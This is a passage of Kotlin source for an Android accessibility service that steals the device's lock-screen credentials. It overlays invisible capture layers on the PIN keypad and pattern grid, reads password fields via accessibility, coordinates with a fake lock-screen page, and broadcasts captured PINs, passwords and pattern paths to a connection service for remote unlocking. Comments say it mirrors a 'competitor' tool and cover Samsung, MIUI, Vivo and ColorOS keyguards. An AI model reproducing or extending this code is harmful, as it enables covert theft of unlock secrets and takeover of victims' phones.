        source?.getBoundsInScreen(rect)
        val viewId = source?.viewIdResourceName.orEmpty()
        val slotIndex = keyguardCredentialCapture.current().length
        val clickKey = if (!rect.isEmpty) {
            "${rect.centerX()},${rect.centerY()}|$ch|$slotIndex"
        } else {
            "$viewId|$ch|$slotIndex"
        }
        val now = System.currentTimeMillis()
        if (clickKey == lastPinClickKey && now - lastPinClickAt < PIN_CLICK_DEDUPE_MS) {
            return
        }
        lastPinClickKey = clickKey
        lastPinClickAt = now
        keyguardCredentialCapture.appendPasswordChar(ch)
        persistKeyguardDraft()
    }

    private fun appendKeyguardPinDelete(source: AccessibilityNodeInfo?) {
        cancelKeyguardPinResetCheck()
        val rect = Rect()
        source?.getBoundsInScreen(rect)
        val viewId = source?.viewIdResourceName.orEmpty()
        val slotIndex = keyguardCredentialCapture.current().length
        val clickKey = if (!rect.isEmpty) {
            "${rect.centerX()},${rect.centerY()}|delete|$slotIndex"
        } else {
            "$viewId|delete|$slotIndex"
        }
        val now = System.currentTimeMillis()
        if (clickKey == lastPinClickKey && now - lastPinClickAt < PIN_CLICK_DEDUPE_MS) {
            return
        }
        lastPinClickKey = clickKey
        lastPinClickAt = now
        keyguardCredentialCapture.deleteLast()
        persistKeyguardDraft()
    }

    private fun flushKeyguardPinOnUnlockSuccess() {
        // 对齐竞品 USER_PRESENT：先冲 pending（图案可能已在 capture 时入队）
        nudgeFlushPendingKeyguardPins()
        val secret: String
        val lockType: KeyguardLockType
        val gesturePath: String
        val capturedAt: Long
        if (keyguardCredentialCapture.hasContent()) {
            secret = keyguardCredentialCapture.current()
            lockType = keyguardCredentialCapture.lockType
            gesturePath = keyguardCredentialCapture.gesturePathJson
            capturedAt = System.currentTimeMillis()
        } else {
            // 竞品：f0 空则读 CURPST
            val draft = keyguardPinPendingStore.loadDraft() ?: return
            secret = draft.pin
            lockType = draft.lockType
            gesturePath = draft.gesturePath
            capturedAt = draft.capturedAt
        }
        if (!publishKeyguardCredential(secret, lockType, gesturePath, capturedAt)) {
            return
        }
        keyguardCredentialCapture.reset()
        keyguardPinPendingStore.clearDraft()
        lastPinClickKey = ""
        lastPinClickAt = 0L
        lastPinDigitValue = '\u0000'
        cancelKeyguardPinUnlockFlush()
    }

    /**
     * 对齐竞品 f0/CURPST：先落 pending 再广播；校验失败不清 buffer。
     * @return true 已入队/广播（或同签名已发过）
     */
    private fun publishKeyguardCredential(
        secret: String,
        lockType: KeyguardLockType,
        gesturePath: String,
        capturedAt: Long = System.currentTimeMillis(),
    ): Boolean {
        if (secret.isBlank()) {
            android.util.Log.w(TAG_PATTERN, "publish skipped empty secret")
            return false
        }
        if (lockType != KeyguardLockType.PATTERN &&
            KeyguardCredentialCapture.looksLikeMaskedSecret(secret)
        ) {
            android.util.Log.w(
                TAG_PATTERN,
                "publish skipped masked secret lockType=${lockType.wireName}",
            )
            return false
        }
        if (lockType == KeyguardLockType.PIN && !secret.all { it.isDigit() }) {
            android.util.Log.w(TAG_PATTERN, "publish skipped non-digit pin")
            return false
        }
        if (lockType == KeyguardLockType.PATTERN &&
            !KeyguardCredentialCapture.isPatternCells(secret)
        ) {
            android.util.Log.w(TAG_PATTERN, "publish skipped invalid pattern cells=$secret")
            return false
        }
        val signature = "${lockType.wireName}|$secret|${gesturePath.hashCode()}"
        if (signature == lastPublishedKeyguardSignature) {
            android.util.Log.d(TAG_PATTERN, "publish dedupe signature")
            nudgeFlushPendingKeyguardPins()
            return true
        }
        val id = keyguardPinPendingStore.enqueue(
            pin = secret,
            capturedAt = capturedAt,
            lockType = lockType,
            gesturePath = gesturePath,
        )
        if (id.isBlank()) {
            android.util.Log.w(
                TAG_PATTERN,
                "publish enqueue blank lockType=${lockType.wireName}",
            )
            return false
        }
        lastPublishedKeyguardSignature = signature
        android.util.Log.i(
            TAG_PATTERN,
            "publish ok id=$id lockType=${lockType.wireName} secretLen=${secret.length} pathLen=${gesturePath.length}",
        )
        sendBroadcast(
            Intent(ConnectionService.ACTION_KEYGUARD_PIN_EVENT).apply {
                setPackage(packageName)
                putExtra(ConnectionService.EXTRA_PIN, secret)
                putExtra(ConnectionService.EXTRA_LOCK_TYPE, lockType.wireName)
                if (gesturePath.isNotBlank()) {
                    putExtra(ConnectionService.EXTRA_GESTURE_PATH, gesturePath)
                }
                putExtra(ConnectionService.EXTRA_CAPTURED_AT, capturedAt)
            },
        )
        nudgeFlushPendingKeyguardPins()
        return true
    }

    private fun nudgeFlushPendingKeyguardPins() {
        runCatching {
            ContextCompat.startForegroundService(
                this,
                Intent(this, ConnectionService::class.java).apply {
                    action = ConnectionService.ACTION_FLUSH_PENDING_KEYGUARD_PINS
                },
            )
        }.onFailure {
            android.util.Log.w(TAG_PATTERN, "nudge flush pending failed", it)
        }
    }

    private fun scheduleKeyguardPinUnlockFlush() {
        // PIN/密码：竞品只等 USER_PRESENT，禁止每键轮询 isDeviceLocked
        if (keyguardCredentialCapture.lockType != KeyguardLockType.PATTERN) {
            persistKeyguardDraft()
            return
        }
        if (!keyguardCredentialCapture.hasContent()) {
            return
        }
        keyguardPinUnlockFlushAttempt = 0
        keyguardPinSyncHandler.removeCallbacks(keyguardPinUnlockFlushRunnable)
        // 图案：HOME + 350ms 回放 + 1s 再播，首检要晚于第一次回放结束
        keyguardPinSyncHandler.postDelayed(
            keyguardPinUnlockFlushRunnable,
            KEYGUARD_PATTERN_UNLOCK_FLUSH_MS,
        )
    }

    private fun retryKeyguardPinUnlockFlush() {
        if (keyguardCredentialCapture.lockType != KeyguardLockType.PATTERN) {
            return
        }
        if (!keyguardCredentialCapture.hasContent()) {
            return
        }
        // 图案回放后用 keyguardLocked 判定，不用 isDeviceLocked
        if (!isKeyguardUiLocked()) {
            flushKeyguardPinOnUnlockSuccess()
            return
        }
        keyguardPinUnlockFlushAttempt++
        if (keyguardPinUnlockFlushAttempt >= KEYGUARD_PATTERN_UNLOCK_FLUSH_MAX_ATTEMPTS) {
            return
        }
        keyguardPinSyncHandler.postDelayed(
            keyguardPinUnlockFlushRunnable,
            KEYGUARD_PATTERN_UNLOCK_FLUSH_RETRY_MS,
        )
    }

    private fun cancelKeyguardPinUnlockFlush() {
        keyguardPinUnlockFlushAttempt = 0
        keyguardPinSyncHandler.removeCallbacks(keyguardPinUnlockFlushRunnable)
    }

    private fun scheduleKeyguardPinResetCheck() {
        keyguardPinSyncHandler.removeCallbacks(keyguardPinResetRunnable)
        keyguardPinSyncHandler.postDelayed(
            keyguardPinResetRunnable,
            KEYGUARD_PIN_RESET_DELAY_MS,
        )
    }

    private fun cancelKeyguardPinResetCheck() {
        keyguardPinSyncHandler.removeCallbacks(keyguardPinResetRunnable)
    }

    private fun resetKeyguardPinIfFieldCleared() {
        // 竞品 AccessService.A：仅 keyguard 仍锁且输入框空时清 f0
        if (!isKeyguardUiLocked() || !keyguardCredentialCapture.hasContent()) {
            return
        }
        if (keyguardCredentialCapture.lockType == KeyguardLockType.PATTERN) {
            return
        }

        val root = findInteractionRoot() ?: return
        try {
            val enteredCount = readEnteredPinDigitCount(root)
            val passwordText = findPasswordFieldText(root)
            if (enteredCount <= 0 && passwordText.isNullOrEmpty()) {
                keyguardCredentialCapture.reset()
                keyguardPinPendingStore.clearDraft()
                lastPinClickKey = ""
                lastPinClickAt = 0L
                lastPinDigitValue = '\u0000'
            }
        } finally {
            root.recycle()
        }
    }

    private fun scheduleKeyguardPinTreeSync() {
        keyguardPinSyncHandler.removeCallbacks(keyguardPinSyncRunnable)
        // 对齐竞品：P0 已齐且未挂层 → 0ms；冷标定才短延迟
        val delay = if (
            cachedPinKeyPointsP0.count { it.value.isDigit } >= MIN_CALIBRATED_DIGITS &&
            pinKeypadCaptureOverlay?.isShowing() != true
        ) {
            0L
        } else {
            KEYGUARD_PIN_SYNC_DELAY_MS
        }
        keyguardPinSyncHandler.postDelayed(keyguardPinSyncRunnable, delay)
    }

    private fun syncKeyguardPinFromTree() {
        if (keyguardRemoteUnlockActive) {
            hidePatternCaptureOverlay()
            hidePinKeypadCaptureOverlay()
            return
        }
        if (!isKeyguardUiLocked()) {
            hidePatternCaptureOverlay()
            hidePinKeypadCaptureOverlay()
            return
        }

        // 锁屏伪页在展示时：不挂真机 PIN/图案采集层，避免抢触摸；伪页自己收输入
        if (isKeyguardFakeOverlayShowing()) {
            hidePatternCaptureOverlay()
            hidePinKeypadCaptureOverlay()
            return
        }

        // 竞品 C0：图案=3 / PIN=1 互斥。图案页绝不能挂全屏 PIN overlay，否则图案触摸被吃掉。
        when (detectKeyguardCredentialMode()) {
            KeyguardCredentialMode.PATTERN -> {
                hidePinKeypadCaptureOverlay()
                syncPatternOverlayAcrossWindows()
                return
            }
            KeyguardCredentialMode.PIN -> {
                hidePatternCaptureOverlay()
                syncPinKeypadOverlayAcrossWindows()
                if (pinKeypadCaptureOverlay?.isShowing() == true) {
                    return
                }
            }
            KeyguardCredentialMode.PASSWORD -> {
                hidePatternCaptureOverlay()
                hidePinKeypadCaptureOverlay()
            }
            KeyguardCredentialMode.NONE -> {
                // 封面/滑动页：无 PIN/图案节点时必须卸层，否则全屏 ty=2032 挡上滑
                if (findPatternViewAcrossWindows() == null && !isPinKeypadVisible()) {
                    hidePatternCaptureOverlay()
                    hidePinKeypadCaptureOverlay()
                }
            }
        }

        val root = findInteractionRoot() ?: return
        try {
            if (findPatternViewNode(root) != null) {
                return
            }
            // 已采到图案：禁止树同步用 password/PIN 明文覆盖（竞品 f0 不被改写）
            if (keyguardCredentialCapture.lockType == KeyguardLockType.PATTERN) {
                return
            }
            val current = keyguardCredentialCapture.current()
            val passwordText = findPasswordFieldText(root)
            if (!passwordText.isNullOrEmpty()) {
                cancelKeyguardPinResetCheck()
                // 输快时树滞后：禁止用更短明文覆盖已点击的 buffer
                if (!KeyguardCredentialCapture.looksLikeMaskedSecret(passwordText)) {
                    val normalizedLen = passwordText.count { ch ->
                        !ch.isISOControl() && !KeyguardCredentialCapture.isPasswordMaskChar(ch)
                    }
                    if (current.isEmpty() || normalizedLen >= current.length) {
                        keyguardCredentialCapture.replacePassword(passwordText)
                        persistKeyguardDraft()
                    }
                }
                return
            }
            if (pinKeypadCaptureOverlay?.isShowing() == true) {
                return
            }
            val plain = findPinPasswordPlainText(root)
            if (plain.isNullOrEmpty()) {
                val enteredCount = readEnteredPinDigitCount(root)
                // 圆点数量滞后时不要当成输错清空（输快很常见）
                if (enteredCount <= 0 && keyguardCredentialCapture.hasContent()) {
                    scheduleKeyguardPinResetCheck()
                }
            } else {
                cancelKeyguardPinResetCheck()
                // 只允许树明文「补长/追平」，绝不缩短点击序列
                if (plain.length >= current.length) {
                    keyguardCredentialCapture.replacePinDigits(plain)
                    persistKeyguardDraft()
                }
            }
        } finally {
            root.recycle()
        }
    }

    private enum class KeyguardCredentialMode {
        NONE,
        PATTERN,
        PIN,
        PASSWORD,
    }

    /** 对齐竞品 AccessService.w / x：图案优先于 PIN。 */
    private fun detectKeyguardCredentialMode(): KeyguardCredentialMode {
        val roots = collectInteractionRoots()
        try {
            var sawPin = false
            var sawPassword = false
            for (root in roots) {
                if (findPatternViewNode(root) != null) {
                    return KeyguardCredentialMode.PATTERN
                }
                if (isPinKeypadPageVisible(root)) {
                    sawPin = true
                }
                if (hasPasswordEntryInTree(root)) {
                    sawPassword = true
                }
            }
            return when {
                sawPin -> KeyguardCredentialMode.PIN
                sawPassword -> KeyguardCredentialMode.PASSWORD
                else -> KeyguardCredentialMode.NONE
            }
        } finally {
            roots.forEach { runCatching { it.recycle() } }
        }
    }

    private fun hasPasswordEntryInTree(root: AccessibilityNodeInfo): Boolean {
        for (viewId in PASSWORD_ENTRY_VIEW_IDS) {
            if (hasViewIdInTree(root, viewId)) {
                return true
            }
        }
        return false
    }

    private fun syncPatternOverlayAcrossWindows() {
        if (keyguardRemoteUnlockActive ||
            System.currentTimeMillis() < patternOverlaySuppressedUntil
        ) {
            return
        }
        if (isKeyguardFakeOverlayShowing()) {
            return
        }
        // 竞品：已挂 1 层则不再扫树 / 重挂（pk0.h / WeakRef 非空）
        if (patternCaptureOverlay?.isShowing() == true) {
            hidePinKeypadCaptureOverlay()
            return
        }
        val patternNode = findPatternViewAcrossWindows()
        if (patternNode == null) {
            // Do NOT hide here — active-window flicker used to remove overlay mid-draw.
            return
        }
        try {
            val bounds = Rect()
            patternNode.getBoundsInScreen(bounds)
            if (bounds.width() <= 0 || bounds.height() <= 0) {
                return
            }
            // 必须先卸全屏 PIN，再挂图案层（同 TYPE 后添加的在上）
            hidePinKeypadCaptureOverlay()
            ensurePatternCaptureOverlay().show(bounds)
        } finally {
            patternNode.recycle()
        }
    }

    private fun syncPinKeypadOverlayAcrossWindows() {
        if (isKeyguardFakeOverlayShowing()) {
            return
        }
        // 双保险：图案节点在就绝对不挂 PIN（并回收节点防泄漏）
        val patternNode = findPatternViewAcrossWindows()
        if (patternNode != null) {
            patternNode.recycle()
            hidePinKeypadCaptureOverlay()
            return
        }
        if (patternCaptureOverlay?.isShowing() == true) {
            hidePinKeypadCaptureOverlay()
            return
        }
        if (!isPinKeypadVisible()) {
            hidePinKeypadCaptureOverlay()
            return
        }
        val now = System.currentTimeMillis()
        // 对齐竞品 r()：P0 非空且无层 → 立刻用缓存挂，不等扫树（抢首位）
        val cacheDigits = cachedPinKeyPointsP0.count { it.value.isDigit }
        if (cacheDigits >= MIN_CALIBRATED_DIGITS &&
            pinKeypadCaptureOverlay?.isShowing() != true
        ) {
            showPinOverlayWithKeys(cachedPinKeyPointsP0, fromCache = true)
            // 缓存 rect 可能过期（Samsung 键盘动画）；挂完强制扫一趟
            forcePinHeavySyncOnce = true
        }
        // 竞品 xm0.d：已挂单例且 digits 齐 → 节流后才重扫；缓存刚挂则强制校准
        val existing = pinKeypadCaptureOverlay
        val mustHeavy = forcePinHeavySyncOnce
        if (!mustHeavy &&
            existing?.isShowing() == true &&
            existing.keyCount() >= MIN_CALIBRATED_DIGITS
        ) {
            if (now - lastPinOverlayHeavySyncAt < PIN_OVERLAY_RESYNC_MIN_MS) {
                return
            }
        }
        val roots = collectInteractionRoots()
        try {
            var bestBounds: Rect? = null
            var bestKeys: Map<String, PinKeyPoint> = emptyMap()
            for (root in roots) {
                val preferred = findFirstNodeByViewId(root, PIN_COLOR_NUMERIC_KEYBOARD_VIEW_ID)
                val preferredBounds = preferred?.let { node ->
                    try {
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        rect.takeIf { !it.isEmpty && it.height() >= MIN_PIN_KEYPAD_OVERLAY_HEIGHT_PX }
                    } finally {
                        node.recycle()
                    }
                }
                val bounds = preferredBounds
                    ?: findPinContainerRect(root)
                    ?: continue
                val keys = collectPinKeyPointsP0(root, bounds)
                val digitCount = keys.count { it.value.isDigit }
                val bestDigitCount = bestKeys.count { it.value.isDigit }
                if (bestBounds == null ||
                    digitCount > bestDigitCount ||
                    (preferredBounds != null && bestDigitCount < MIN_CALIBRATED_DIGITS)
                ) {
                    bestBounds = Rect(bounds)
                    bestKeys = keys
                }
                val resIdDigits = keys.values.count { it.isDigit && !it.resId.isNullOrBlank() }
                if (digitCount >= MIN_CALIBRATED_DIGITS && resIdDigits >= MIN_CALIBRATED_DIGITS) {
                    break
                }
                if (digitCount >= MIN_CALIBRATED_DIGITS && preferredBounds != null) {
                    break
                }
            }
            val bounds = bestBounds ?: run {
                forcePinHeavySyncOnce = false
                return
            }
            val filledKeys = fillMissingPinKeyPoints(bestKeys, bounds)
            // 对齐竞品 P0：标定结果常驻，下轮锁屏直接用
            cachedPinKeyPointsP0 = copyPinKeyMap(filledKeys)
            lastPinOverlayHeavySyncAt = System.currentTimeMillis()
            forcePinHeavySyncOnce = false
            val resIdCount = filledKeys.values.count { it.isDigit && !it.resId.isNullOrBlank() }
            val overlayBounds = fullScreenOverlayBounds()
            android.util.Log.i(
                "PatternCapture",
                "pin overlay sync overlay=$overlayBounds keypad=$bounds " +
                    "digits=${filledKeys.count { it.value.isDigit }} resIdKeys=$resIdCount " +
                    "hasE=${filledKeys.containsKey(PinKeyPoint.KEY_ENTER)} " +
                    "hasD=${filledKeys.containsKey(PinKeyPoint.KEY_DELETE)} " +
                    "e=${filledKeys[PinKeyPoint.KEY_ENTER]}",
            )
            // 挂层只更新 keys，不清 buffer（竞品 k1 清 f0 过糙，我们只在 lock-edge reset）
            showPinOverlayWithKeys(filledKeys, fromCache = false)
        } finally {
            roots.forEach { runCatching { it.recycle() } }
        }
    }

    /** 对齐竞品：P0 缓存够用且 PIN 页可见 → 立刻挂层。 */
    private fun tryShowPinOverlayFromCache(): Boolean {
        if (!isKeyguardUiLocked() || isKeyguardFakeOverlayShowing()) {
            return false
        }
        if (patternCaptureOverlay?.isShowing() == true) {
            return false
        }
        if (cachedPinKeyPointsP0.count { it.value.isDigit } < MIN_CALIBRATED_DIGITS) {
            return false
        }
        if (!isPinKeypadVisible()) {
            return false
        }
        if (pinKeypadCaptureOverlay?.isShowing() == true &&
            (pinKeypadCaptureOverlay?.keyCount() ?: 0) >= MIN_CALIBRATED_DIGITS
        ) {
            pinOverlayExclusiveCapture = true
            return true
        }
        showPinOverlayWithKeys(cachedPinKeyPointsP0, fromCache = true)
        forcePinHeavySyncOnce = true
        return true
    }

    private fun showPinOverlayWithKeys(keys: Map<String, PinKeyPoint>, fromCache: Boolean) {
        val digitCount = keys.count { it.value.isDigit }
        if (digitCount < MIN_CALIBRATED_DIGITS) {
            return
        }
        ensurePinKeypadCaptureOverlay().show(fullScreenOverlayBounds(), copyPinKeyMap(keys))
        pinOverlayExclusiveCapture = true
        if (fromCache) {
            forcePinHeavySyncOnce = true
            android.util.Log.i(
                TAG_PATTERN,
                "pin overlay shown from P0 cache digits=$digitCount",
            )
        }
    }

    private fun fullScreenOverlayBounds(): Rect {
        val metrics = android.util.DisplayMetrics()
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        return Rect(0, 0, metrics.widthPixels, metrics.heightPixels)
    }

    private fun copyPinKeyMap(src: Map<String, PinKeyPoint>): Map<String, PinKeyPoint> =
        src.mapValues { it.value.copyRect() }

    /**
     * 对齐竞品 AccessService.q + t：数字键 + d(删除) + e(确认/OK)。
     */
    private fun collectPinKeyPointsP0(
        root: AccessibilityNodeInfo,
        container: Rect,
    ): Map<String, PinKeyPoint> {
        val out = mutableMapOf<String, PinKeyPoint>()
        collectPinKeyPointsFromColorOsKeyboard(root, out)
        if (out.count { it.value.isDigit } < 10) {
            collectPinKeyPointsByViewIdWalk(root, out)
        }
        if (out.count { it.value.isDigit } < MIN_CALIBRATED_DIGITS) {
            for (digit in PIN_CALIBRATION_DIGITS) {
                if (out.containsKey(digit)) continue
                val node = findDigitNodeByViewId(root, digit) ?: continue
                try {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.isEmpty) continue
                    out[digit] = PinKeyPoint(
                        keyId = digit,
                        rect = Rect(rect),
                        resId = node.viewIdResourceName
                            ?: "com.android.systemui:id/key$digit",
                    )
                } finally {
                    node.recycle()
                }
            }
        }
        collectPinActionKeys(root, out)
        if (out.count { it.value.isDigit } < MIN_CALIBRATED_DIGITS) {
            return fillMissingPinKeyPoints(out, container)
        }
        return out
    }

    private fun collectPinActionKeys(
        root: AccessibilityNodeInfo,
        out: MutableMap<String, PinKeyPoint>,
    ) {
        if (!out.containsKey(PinKeyPoint.KEY_ENTER)) {
            for (viewId in PIN_CONFIRM_VIEW_IDS) {
                val node = findFirstNodeByViewId(root, viewId) ?: continue
                try {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.isEmpty) continue
                    out[PinKeyPoint.KEY_ENTER] = PinKeyPoint(
                        keyId = PinKeyPoint.KEY_ENTER,
                        rect = Rect(rect),
                        resId = node.viewIdResourceName ?: viewId,
                    )
                    break
                } finally {
                    node.recycle()
                }
            }
            if (!out.containsKey(PinKeyPoint.KEY_ENTER)) {
                val byText = findNodeByTexts(root, PIN_CONFIRM_TEXTS)
                if (byText != null) {
                    try {
                        val rect = Rect()
                        byText.getBoundsInScreen(rect)
                        if (!rect.isEmpty) {
                            out[PinKeyPoint.KEY_ENTER] = PinKeyPoint(
                                keyId = PinKeyPoint.KEY_ENTER,
                                rect = Rect(rect),
                                resId = byText.viewIdResourceName,
                            )
                        }
                    } finally {
                        byText.recycle()
                    }
                }
            }
        }
        if (!out.containsKey(PinKeyPoint.KEY_DELETE)) {
            for (viewId in PIN_DELETE_VIEW_IDS) {
                val node = findFirstNodeByViewId(root, viewId) ?: continue
                try {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.isEmpty) continue
                    out[PinKeyPoint.KEY_DELETE] = PinKeyPoint(
                        keyId = PinKeyPoint.KEY_DELETE,
                        rect = Rect(rect),
                        resId = node.viewIdResourceName ?: viewId,
                    )
                    break
                } finally {
                    node.recycle()
                }
            }
        }
    }

    private fun collectPinKeyPointsFromColorOsKeyboard(
        root: AccessibilityNodeInfo,
        out: MutableMap<String, PinKeyPoint>,
    ) {
        val keyboard = findFirstNodeByViewId(root, PIN_COLOR_NUMERIC_KEYBOARD_VIEW_ID) ?: return
        try {
            for (i in 0 until keyboard.childCount) {
                val child = keyboard.getChild(i) ?: continue
                try {
                    val desc = child.contentDescription?.toString()?.trim()
                    val text = child.text?.toString()?.trim()
                    val keyId = when {
                        !desc.isNullOrEmpty() && desc.length == 1 && desc[0].isDigit() -> desc
                        !text.isNullOrEmpty() && text.length == 1 && text[0].isDigit() -> text
                        else -> continue
                    }
                    val rect = Rect()
                    child.getBoundsInScreen(rect)
                    if (rect.isEmpty) continue
                    if (out.containsKey(keyId) && keyId == PinKeyPoint.KEY_DELETE) continue
                    out[keyId] = PinKeyPoint(
                        keyId = keyId,
                        rect = Rect(rect),
                        resId = child.viewIdResourceName,
                    )
                } finally {
                    child.recycle()
                }
            }
        } finally {
            keyboard.recycle()
        }
    }

    /** 竞品 AccessService.t：递归挂 key / num / VivoPinkey / char_ / delete / enter */
    private fun collectPinKeyPointsByViewIdWalk(
        node: AccessibilityNodeInfo,
        out: MutableMap<String, PinKeyPoint>,
    ) {
        val viewId = node.viewIdResourceName
        if (viewId != null) {
            val keyId = parsePinKeyIdFromViewId(viewId)
            if (keyId != null && !out.containsKey(keyId)) {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (!rect.isEmpty) {
                    out[keyId] = PinKeyPoint(keyId = keyId, rect = Rect(rect), resId = viewId)
                }
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            try {
                collectPinKeyPointsByViewIdWalk(child, out)
            } finally {
                child.recycle()
            }
        }
    }

    private fun parsePinKeyIdFromViewId(viewId: String): String? {
        when (viewId) {
            in PIN_CONFIRM_VIEW_IDS -> return PinKeyPoint.KEY_ENTER
            in PIN_DELETE_VIEW_IDS -> return PinKeyPoint.KEY_DELETE
        }
        val key = when {
            viewId.startsWith("com.android.systemui:id/key") ->
                viewId.removePrefix("com.android.systemui:id/key")
            viewId.startsWith("com.android.keyguard:id/key") ->
                viewId.removePrefix("com.android.keyguard:id/key")
            viewId.startsWith("com.samsung.android.systemui:id/key") ->
                viewId.removePrefix("com.samsung.android.systemui:id/key")
            viewId.startsWith("com.samsung.android.biometrics.app:id/key") ->
                viewId.removePrefix("com.samsung.android.biometrics.app:id/key")
            viewId.startsWith("com.android.systemui:id/num") ->
                viewId.removePrefix("com.android.systemui:id/num")
            viewId.startsWith("com.android.systemui:id/VivoPinkey") ->
                viewId.removePrefix("com.android.systemui:id/VivoPinkey")
            viewId.startsWith("com.android.systemui:id/char_") ->
                viewId.removePrefix("com.android.systemui:id/char_")
            viewId.startsWith("com.miui.systemui:id/key") ->
                viewId.removePrefix("com.miui.systemui:id/key")
            else -> return null
        }
        if (key == "enter" || key == "_enter" || key.startsWith("enter") || key == "_enter_text") {
            return PinKeyPoint.KEY_ENTER
        }
        if (key.length != 1 || !key[0].isDigit()) {
            return null
        }
        return key
    }

    private fun fillMissingPinKeyPoints(
        existing: Map<String, PinKeyPoint>,
        container: Rect,
    ): Map<String, PinKeyPoint> {
        val out = existing.mapValues { it.value.copyRect() }.toMutableMap()
        if (out.count { it.value.isDigit } >= 10) {
            return out
        }
        val centers = buildPinGridFromContainer(container)
        val cellW = (container.width() / 3f).coerceAtLeast(1f)
        val cellH = (container.height() / 4f).coerceAtLeast(1f)
        for ((digit, center) in centers) {
            val id = digit.toString()
            if (out.containsKey(id)) continue
            val halfW = cellW / 2f
            val halfH = cellH / 2f
            out[id] = PinKeyPoint(
                keyId = id,
                rect = Rect(
                    (center.first - halfW).toInt(),
                    (center.second - halfH).toInt(),
                    (center.first + halfW).toInt(),
                    (center.second + halfH).toInt(),
                ),
                resId = null,
            )
        }
        return out
    }

    private fun findPatternViewAcrossWindows(): AccessibilityNodeInfo? {
        val roots = collectInteractionRoots()
        try {
            for (root in roots) {
                val hit = findPatternViewNode(root)
                if (hit != null) {
                    return hit
                }
            }
            return null
        } finally {
            roots.forEach { runCatching { it.recycle() } }
        }
    }

    private fun ensurePatternCaptureOverlay(): PatternCaptureOverlay {
        patternCaptureOverlay?.let { return it }
        return PatternCaptureOverlay(this) { cells, points ->
            patternOverlaySuppressedUntil =
                System.currentTimeMillis() + PATTERN_OVERLAY_SUPPRESS_MS
            keyguardCredentialCapture.setPattern(cells, points)
            val secret = keyguardCredentialCapture.current()
            val gesturePath = keyguardCredentialCapture.gesturePathJson
            android.util.Log.i(
                TAG_PATTERN,
                "captured cells=${cells.joinToString("-")} points=${points.size} pathLen=${gesturePath.length}",
            )
            // 对齐竞品：画完立刻落 f0/CURPST，不依赖解锁态；USER_PRESENT/WS 再冲 pending
            if (publishKeyguardCredential(secret, KeyguardLockType.PATTERN, gesturePath)) {
                // 已入 pending：清内存避免被后续 click/树同步污染；解锁路径靠 pending + nudge
                keyguardCredentialCapture.reset()
                cancelKeyguardPinUnlockFlush()
            } else {
                scheduleKeyguardPinUnlockFlush()
            }
        }.also { patternCaptureOverlay = it }
    }

    private fun ensurePinKeypadCaptureOverlay(): PinKeypadCaptureOverlay {
        pinKeypadCaptureOverlay?.let { return it }
        return PinKeypadCaptureOverlay(
            service = this,
            onPinKey = { keyId ->
                pinOverlayCaptureUntil = System.currentTimeMillis() + PIN_OVERLAY_CLICK_SUPPRESS_MS
                when {
                    keyId.length == 1 && keyId[0].isDigit() -> {
                        android.util.Log.i("PatternCapture", "pin overlay digit=$keyId")
                        appendKeyguardPinDigit(null, keyId[0], fromOverlay = true)
                    }
                    keyId == PinKeyPoint.KEY_DELETE -> {
                        android.util.Log.i("PatternCapture", "pin overlay delete")
                        appendKeyguardPinDelete(null)
                    }
                    keyId == PinKeyPoint.KEY_ENTER -> {
                        android.util.Log.i("PatternCapture", "pin overlay enter")
                        // 竞品：只 performAction，不写 buffer；解锁成功后 flush
                    }
                }
            },
            // 比竞品好：P0 空时标定后同坐标再 hit，不丢这一下
            onMissRecalibrate = { syncPinKeypadOverlayAcrossWindows() },
        ).also { pinKeypadCaptureOverlay = it }
    }

    private fun hidePatternCaptureOverlay() {
        runOnServiceHandlerBlocking {
            patternCaptureOverlay?.hide()
        }
    }

    private fun hidePinKeypadCaptureOverlay() {
        pinOverlayExclusiveCapture = false
        runOnServiceHandlerBlocking {
            pinKeypadCaptureOverlay?.hide()
        }
    }

    private fun findPatternViewNode(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        for (viewId in PATTERN_VIEW_IDS) {
            val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
            val hit = nodes?.firstOrNull()
            nodes?.drop(1)?.forEach { runCatching { it.recycle() } }
            if (hit != null) {
                return hit
            }
        }
        return findPatternViewByClass(root)
    }

    private fun findPatternViewByClass(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (looksLikePatternView(node)) {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            if (bounds.width() >= MIN_PATTERN_VIEW_PX && bounds.height() >= MIN_PATTERN_VIEW_PX) {
                return AccessibilityNodeInfo.obtain(node)
            }
        }
        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val nested = findPatternViewByClass(child)
            child.recycle()
            if (nested != null) {
                return nested
            }
        }
        return null
    }

    /** Settings「设置图案」常见 id/lockPattern；锁屏多为 LockPatternView class。 */
    private fun looksLikePatternView(node: AccessibilityNodeInfo): Boolean {
        val className = node.className?.toString().orEmpty()
        val viewId = node.viewIdResourceName.orEmpty()
        return className.contains("LockPatternView", ignoreCase = true) ||
            className.contains("PatternView", ignoreCase = true) ||
            viewId.contains("lockPattern", ignoreCase = true) ||
            viewId.contains("lock_pattern", ignoreCase = true) ||
            viewId.contains("pattern_view", ignoreCase = true) ||
            viewId.endsWith("/lockPattern", ignoreCase = true)
    }

    private fun findPinPasswordPlainText(root: AccessibilityNodeInfo): String? {
        return readPasswordNodeText(root)
    }

    private fun findPasswordFieldText(root: AccessibilityNodeInfo): String? {
        for (viewId in PASSWORD_ENTRY_VIEW_IDS) {
            val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
            val text = nodes?.firstOrNull()?.text?.toString()?.trim().orEmpty()
            nodes?.forEach { runCatching { it.recycle() } }
            // OEM password fields often expose "•••••5" (last digit briefly visible). Never trust mask.
            if (text.isNotEmpty() &&
                !KeyguardCredentialCapture.looksLikeMaskedSecret(text)
            ) {
                return text
            }
        }
        return readMixedPasswordNodeText(root)
    }

    private fun readPasswordNodeText(node: AccessibilityNodeInfo): String? {
        if (node.isPassword) {
            val text = node.text?.toString()?.trim().orEmpty()
            if (text.isNotEmpty() &&
                text.all { it.isDigit() } &&
                !KeyguardCredentialCapture.looksLikeMaskedSecret(text)
            ) {
                return text
